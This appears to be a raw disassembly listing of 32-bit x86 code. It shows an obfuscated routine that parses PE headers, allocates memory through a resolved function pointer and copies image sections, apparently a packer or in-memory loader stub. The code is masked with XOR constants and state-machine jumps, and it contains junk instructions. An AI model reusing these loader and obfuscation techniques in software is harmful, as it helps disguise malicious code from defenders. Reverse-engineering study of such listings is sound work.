  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	inc    bp
  420607:	add    edx,DWORD PTR [edx+0x9]
  42060a:	or     BYTE PTR [ebx+0x1fc0001],al
  420610:	add    BYTE PTR [eax],al
  420612:	dec    edi
  420613:	or     ebx,DWORD PTR [edx+0x48]
  420616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420617:	inc    ebx
  420618:	test   eax,0x9ce3e5
  42061d:	fst    DWORD PTR [eax+0x1ab4b1b7]
  420623:	mov    ecx,0x58a609db
  420628:	jae    0x420634
  42062a:	pop    eax
  42062b:	aaa    
  42062c:	mov    eax,0x4ad761e4
  420631:	and    eax,0xa4e720c3
  420636:	ret    0xbff7
  420639:	fdiv   QWORD PTR [ebx+0x58]
  42063c:	push   0x71
  42063e:	jl     0x4205d8
  420640:	xchg   ebx,eax
  420641:	lahf   
  420642:	(bad)  
  420643:	mov    BYTE PTR [edi],cl
  420645:	jmp    0x39f1d59e
  42064a:	pop    ebp
  42064b:	cmp    eax,0x379bdfbb
  420650:	imul   BYTE PTR [ebp-0x503a208]
  420656:	mov    eax,ds:0xf11d3c26
